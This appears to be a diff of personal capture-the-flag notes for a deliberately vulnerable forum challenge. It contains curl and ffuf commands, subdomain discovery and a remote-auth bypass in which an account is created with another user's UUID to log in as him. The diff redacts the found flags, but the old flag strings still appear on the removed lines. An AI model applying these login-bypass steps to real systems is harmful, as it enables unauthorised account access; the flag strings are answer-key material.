@@ -26,7 +26,7 @@ ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNG
 curl -X POST -d "username=&password=&method=remote" "http://vulnforum.co.uk/login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
 
 #1 FLAG Found
-{"display_msg":"Server Error","technical_msg":"Server \"http:\/\/jv5iwqxt.auth.vulnforum.co.uk\/auth\" responded with a 404 error","flag":"[^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]"}     
+{"display_msg":"Server Error","technical_msg":"Server \"http:\/\/jv5iwqxt.auth.vulnforum.co.uk\/auth\" responded with a 404 error","flag":""}     
 
 //at jv5iwqxt.auth.vulnforum.co.uk I'm hitting a wall. 
 //Subdomain discovered: auth.vulnforum.co.uk
@@ -35,7 +35,6 @@ curl -X POST -d "username=&password=&method=remote" "http://vulnforum.co.uk/logi
 curl  http://vulnauth.co.uk/ -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -v
 
 #2 FLAG FOUND
-[^FLAG^A959EBEC1D9A02A456FC5BCCF7BA8D91^FLAG^]
 
 //Sign up page...
 curl -X POST -d "signup_domain=jv5iwqxt.auth.vulnforum.co.uk&signup_email=tmo@mail.com&signup_password=123456&"  http://vulnauth.co.uk/ -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -v
@@ -50,11 +49,11 @@ username: 1
 UUID: 1
 password: 1
 
-Response: {"display_msg":"Could not lookup user from remote hash","technical_msg":"local_uuid could not be found on database","flag":"[^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]"}   
+Response: {"display_msg":"Could not lookup user from remote hash","technical_msg":"local_uuid could not be found on database","flag":""}   
 
 //Creating user with toby's uuid
 username: toby
-UUID: [^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]
+UUID: FLAg
 password: 123
 
 //Logging into the page with credentails:
@@ -63,7 +62,6 @@ password: 123
 //changing mode to remote.
 
 #3 FLAG Found 
-[^FLAG^3B1A170C3033B788FEB1B1A4E45D62CD^FLAG^]
 
 //Successfully logged in.
 
